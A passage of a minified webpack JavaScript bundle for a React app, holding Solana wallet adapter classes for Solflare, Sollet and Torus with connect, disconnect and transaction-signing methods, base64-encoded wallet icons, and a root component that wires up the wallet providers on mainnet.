Ny0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC44ODE5IDguOTgwMiA4Ljg4MTl6IiBmaWxsPSJ1cmwoI2MpIi8+PC9zdmc+", this._readyState = "undefined" === typeof window || "undefined" === typeof document ? O.Unsupported : O.Loadable, this._disconnected = () => {
                    const e = this._wallet;
                    e && (e.off("disconnect", this._disconnected), this._publicKey = null, this.emit("error", new U), this.emit("disconnect"))
                }, this._connecting = !1, this._publicKey = null, this._wallet = null, this._config = e, this._readyState !== O.Unsupported && J((() => {
                    var e;
                    return !(!(null === (e = window.solflare) || void 0 === e ? void 0 : e.isSolflare) && !window.SolflareApp) && (this._readyState = O.Installed, this.emit("readyStateChange", this._readyState), !0)
                }))
            }
            get publicKey() {
                return this._publicKey
            }
            get connecting() {
                return this._connecting
            }
            get connected() {
                var e;
                return !!(null === (e = this._wallet) || void 0 === e ? void 0 : e.connected)
            }
            get readyState() {
                return this._readyState
            }
            async connect() {
                try {
                    if (this.connected || this.connecting) return;
                    if (this._readyState !== O.Loadable && this._readyState !== O.Installed) throw new N;
                    let t, n, r;
                    try {
                        ({
                            default: t
                        } = await __webpack_require__.e(912).then(__webpack_require__.bind(__webpack_require__, 7912)))
                    } catch (e) {
                        throw new R(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        n = new t({
                            network: this._config.network
                        })
                    } catch (e) {
                        throw new D(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    if (this._connecting = !0, !n.connected) try {
                        await n.connect()
                    } catch (e) {
                        throw new z(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    if (!n.publicKey) throw new z;
                    try {
                        r = new _.PublicKey(n.publicKey.toBytes())
                    } catch (e) {
                        throw new H(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    n.on("disconnect", this._disconnected), this._wallet = n, this._publicKey = r, this.emit("connect", r)
                } catch (e) {
                    throw this.emit("error", e), e
                } finally {
                    this._connecting = !1
                }
            }
            async disconnect() {
                const e = this._wallet;
                if (e) {
                    e.off("disconnect", this._disconnected), this._publicKey = null;
                    try {
                        await e.disconnect()
                    } catch (t) {
                        this.emit("error", new j(null === t || void 0 === t ? void 0 : t.message, t))
                    }
                }
                this.emit("disconnect")
            }
            async signTransaction(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signTransaction(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signAllTransactions(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signAllTransactions(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signMessage(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signMessage(e, "utf8")
                    } catch (t) {
                        throw new q(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
        }
        class gu extends ou {
            constructor() {
                let {
                    provider: e,
                    network: t = ru.Mainnet,
                    timeout: n = 1e4
                } = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                super(), this._readyState = "undefined" === typeof window || "undefined" === typeof document ? O.Unsupported : O.NotDetected, this._disconnected = () => {
                    const e = this._wallet;
                    e && (e.off("disconnect", this._disconnected), this._wallet = null, this.emit("error", new U), this.emit("disconnect"))
                }, this._provider = e, this._network = t, this._timeout = n, this._connecting = !1, this._wallet = null, this._readyState !== O.Unsupported && ("string" === typeof this._provider ? this._readyState = O.Loadable : J((() => {
                    var e;
                    return "function" === typeof(null === (e = window.sollet) || void 0 === e ? void 0 : e.postMessage) && (this._readyState = O.Installed, this.emit("readyStateChange", this._readyState), !0)
                })))
            }
            get publicKey() {
                var e;
                return (null === (e = this._wallet) || void 0 === e ? void 0 : e.publicKey) || null
            }
            get connecting() {
                return this._connecting
            }
            get connected() {
                var e;
                return !!(null === (e = this._wallet) || void 0 === e ? void 0 : e.connected)
            }
            get readyState() {
                return this._readyState
            }
            async connect() {
                try {
                    if (this.connected || this.connecting) return;
                    if (this._readyState !== O.Loadable && this._readyState !== O.Installed) throw new N;
                    this._connecting = !0;
                    const t = this._provider || window.sollet;
                    let n, r;
                    try {
                        ({
                            default: n
                        } = await __webpack_require__.e(714).then(__webpack_require__.bind(__webpack_require__, 5714)))
                    } catch (e) {
                        throw new R(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        r = new n(t, this._network)
                    } catch (e) {
                        throw new D(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        const e = r.handleDisconnect;
                        let n, i;
                        try {
                            await new Promise(((o, s) => {
                                const a = () => {
                                    n && clearTimeout(n), r.off("connect", a), o()
                                };
                                if (r.handleDisconnect = function() {
                                        r.off("connect", a), s(new Y);
                                        for (var t = arguments.length, n = new Array(t), i = 0; i < t; i++) n[i] = arguments[i];
                                        return e.apply(r, n)
                                    }, r.on("connect", a), r.connect().catch((e => {
                                        r.off("connect", a), s(e)
                                    })), "string" === typeof t) {
                                    let e = 0;
                                    i = setInterval((() => {
                                        const t = r._popup;
                                        t ? t.closed && s(new Y) : e > 50 && s(new G), e++
                                    }), 100)
                                } else n = setTimeout((() => s(new Q)), this._timeout)
                            }))
                        } finally {
                            r.handleDisconnect = e, i && clearInterval(i)
                        }
                    } catch (e) {
                        if (e instanceof L) throw e;
                        throw new z(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    if (!r.publicKey) throw new H;
                    r.on("disconnect", this._disconnected), this._wallet = r, this.emit("connect", r.publicKey)
                } catch (e) {
                    throw this.emit("error", e), e
                } finally {
                    this._connecting = !1
                }
            }
            async disconnect() {
                const e = this._wallet;
                if (e) {
                    e.off("disconnect", this._disconnected), this._wallet = null;
                    const n = e.handleDisconnect;
                    try {
                        await new Promise(((t, r) => {
                            const i = setTimeout((() => t()), 250);
                            e.handleDisconnect = function() {
                                clearTimeout(i), t(), e._responsePromises = new Map;
                                for (var r = arguments.length, o = new Array(r), s = 0; s < r; s++) o[s] = arguments[s];
                                return n.apply(e, o)
                            }, e.disconnect().then((() => {
                                clearTimeout(i), t()
                            }), (e => {
                                clearTimeout(i), "Wallet disconnected" === (null === e || void 0 === e ? void 0 : e.message) ? t() : r(e)
                            }))
                        }))
                    } catch (t) {
                        this.emit("error", new j(null === t || void 0 === t ? void 0 : t.message, t))
                    } finally {
                        e.handleDisconnect = n
                    }
                }
                this.emit("disconnect")
            }
            async signTransaction(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signTransaction(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signAllTransactions(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signAllTransactions(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signMessage(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        const {
                            signature: t
                        } = await n.sign(e, "utf8");
                        return Uint8Array.from(t)
                    } catch (t) {
                        throw new q(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
        }
        class mu extends gu {
            constructor() {
                let {
                    provider: e = "https://www.sollet.io",
                    ...t
                } = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                super({
                    provider: e,
                    ...t
                }), this.name = "Sollet", this.url = "https://www.sollet.io", this.icon = "data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjUzMCIgd2lkdGg9IjUzMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtLTEtMWg1MzJ2NTMyaC01MzJ6IiBmaWxsPSJub25lIi8+PGcgZmlsbD0iIzAwZmZhMyI+PHBhdGggZD0ibTg4Ljg4OTM1IDM3Mi45ODIwMWMzLjE5My0zLjE5IDcuNTIyLTQuOTgyIDEyLjAzNS00Ljk4Mmg0MTYuNDYxYzcuNTg2IDAgMTEuMzg0IDkuMTc0IDYuMDE3IDE0LjUzNmwtODIuMjkxIDgyLjIyNmMtMy4xOTMgMy4xOTEtNy41MjIgNC45ODMtMTIuMDM2IDQuOTgzaC00MTYuNDYwMWMtNy41ODY2IDAtMTEuMzg0NS05LjE3NC02LjAxNzgtMTQuNTM3bDgyLjI5MTktODIuMjI2eiIvPjxwYXRoIGQ9Im04OC44ODkzNSA2NS45ODI1YzMuMTkzLTMuMTkwNCA3LjUyMi00Ljk4MjUgMTIuMDM1LTQuOTgyNWg0MTYuNDYxYzcuNTg2IDAgMTEuMzg0IDkuMTczOSA2LjAxNyAxNC41MzYzbC04Mi4yOTEgODIuMjI2N2MtMy4xOTMgMy4xOS03LjUyMiA0Ljk4Mi0xMi4wMzYgNC45ODJoLTQxNi40NjAxYy03LjU4NjYgMC0xMS4zODQ1LTkuMTc0LTYuMDE3OC0xNC41MzZsODIuMjkxOS04Mi4yMjY1eiIvPjxwYXRoIGQ9Im00NDEuMTExMzUgMjE5LjEwOTVjLTMuMTkzLTMuMTktNy41MjItNC45ODItMTIuMDM2LTQuOTgyaC00MTYuNDYwMWMtNy41ODY2IDAtMTEuMzg0NSA5LjE3My02LjAxNzggMTQuNTM2bDgyLjI5MTkgODIuMjI2YzMuMTkzIDMuMTkgNy41MjIgNC45ODMgMTIuMDM1IDQuOTgzaDQxNi40NjFjNy41ODYgMCAxMS4zODQtOS4xNzQgNi4wMTctMTQuNTM3eiIvPjwvZz48L3N2Zz4="
            }
        }
        class wu extends gu {
            constructor() {
                super(...arguments), this.name = "Sollet (Extension)", this.url = "https://chrome.google.com/webstore/detail/sollet/fhmfendgdocmcbmfikdcogofphimnkno", this.icon = "data:image/png;base64,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"
            }
        }
        class bu extends ou {
            constructor() {
                let {
                    params: e = {
                        showTorusButton: !1
                    }
                } = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                super(), this.name = "Torus", this.url = "https://tor.us", this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzMiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMyAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYuNSIgY3k9IjE2IiByPSIxNiIgZmlsbD0iIzAzNjRGRiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTExLjIxODYgOS40OTIxOUMxMC40NTM5IDkuNDkyMTkgOS44MzM5OCAxMC4xMTIxIDkuODMzOTggMTAuODc2OFYxMi40ODk4QzkuODMzOTggMTMuMjU0NSAxMC40NTM5IDEzLjg3NDQgMTEuMjE4NiAxMy44NzQ0SDEzLjY2ODRWMjIuODk3NkMxMy42Njg0IDIzLjY2MjMgMTQuMjg4MyAyNC4yODIyIDE1LjA1MyAyNC4yODIySDE2LjY2NkMxNy40MzA3IDI0LjI4MjIgMTguMDUwNiAyMy42NjIzIDE4LjA1MDYgMjIuODk3NlYxMi41MDE1QzE4LjA1MDYgMTIuNDk3NiAxOC4wNTA2IDEyLjQ5MzcgMTguMDUwNiAxMi40ODk4VjEwLjg3NjhDMTguMDUwNiAxMC4xMTIxIDE3LjQzMDcgOS40OTIxOSAxNi42NjYgOS40OTIxOUgxNS4wNTNIMTEuMjE4NloiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0yMS4zMzc2IDEzLjg3NDRDMjIuNTQ3NyAxMy44NzQ0IDIzLjUyODcgMTIuODkzNCAyMy41Mjg3IDExLjY4MzNDMjMuNTI4NyAxMC40NzMyIDIyLjU0NzcgOS40OTIxOSAyMS4zMzc2IDkuNDkyMTlDMjAuMTI3NSA5LjQ5MjE5IDE5LjE0NjUgMTAuNDczMiAxOS4xNDY1IDExLjY4MzNDMTkuMTQ2NSAxMi44OTM0IDIwLjEyNzUgMTMuODc0NCAyMS4zMzc2IDEzLjg3NDRaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K", this._readyState = "undefined" === typeof window || "undefined" === typeof document ? O.Unsupported : O.Loadable, this._connecting = !1, this._wallet = null, this._publicKey = null, this._params = e
            }
            get publicKey() {
                return this._publicKey
            }
            get connecting() {
                return this._connecting
            }
            get connected() {
                var e;
                return !!(null === (e = this._wallet) || void 0 === e ? void 0 : e.isLoggedIn)
            }
            get readyState() {
                return this._readyState
            }
            async connect() {
                try {
                    if (this.connected || this.connecting) return;
                    if (this._readyState !== O.Loadable) throw new N;
                    let t, n, r, i;
                    this._connecting = !0;
                    try {
                        ({
                            default: t
                        } = await Promise.all([__webpack_require__.e(592), __webpack_require__.e(997)]).then(__webpack_require__.bind(__webpack_require__, 3592)))
                    } catch (e) {
                        throw new R(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        n = window.torus || new t
                    } catch (e) {
                        throw new D(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    if (!n.isInitialized) try {
                        await n.init(this._params)
                    } catch (e) {
                        throw new z(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        r = await n.login()
                    } catch (e) {
                        throw new F(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        i = new _.PublicKey(r[0])
                    } catch (e) {
                        throw new H(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    this._wallet = n, this._publicKey = i, this.emit("connect", i)
                } catch (e) {
                    throw this.emit("error", e), e
                } finally {
                    this._connecting = !1
                }
            }
            async disconnect() {
                const e = this._wallet;
                if (e) {
                    this._wallet = null, this._publicKey = null;
                    try {
                        e.isLoggedIn && await e.cleanUp()
                    } catch (t) {
                        this.emit("error", new j(null === t || void 0 === t ? void 0 : t.message, t))
                    }
                }
                this.emit("disconnect")
            }
            async signTransaction(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signTransaction(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signAllTransactions(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signAllTransactions(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signMessage(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signMessage(e)
                    } catch (t) {
                        throw new q(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
        }
        __webpack_require__(9752);
        const vu = t => {
            let {
                children: n = null
            } = t;
            const r = ru.Mainnet,
                i = (0, e.useMemo)((() => (0, _.clusterApiUrl)(r)), [r]),
                s = (0, e.useMemo)((() => [new du, new su, new pu, new yu({
                    network: r
                }), new bu, new hu, new wu, new mu]), [r]);
            return (0, o.jsx)(S, {
                endpoint: i,
                children: (0, o.jsx)(ee, {
                    autoConnect: !0,
                    wallets: s,
                    children: (0, o.jsx)(pe, {
                        children: n
                    })
                })
            })
        };
        t.createRoot(document.getElementById("root")).render((0, o.jsx)(e.StrictMode, {
            children: (0, o.jsx)(vu, {
                children: (0, o.jsx)(tu, {})
            })
        })), nu()
    })()
})();
//# sourceMappingURL=main.551630ec.js.map